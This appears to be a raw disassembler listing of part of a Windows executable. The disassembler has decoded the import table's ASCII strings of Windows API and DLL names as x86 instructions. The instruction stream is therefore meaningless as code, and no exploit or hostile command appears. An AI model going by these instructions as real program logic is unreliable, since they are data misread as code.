  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
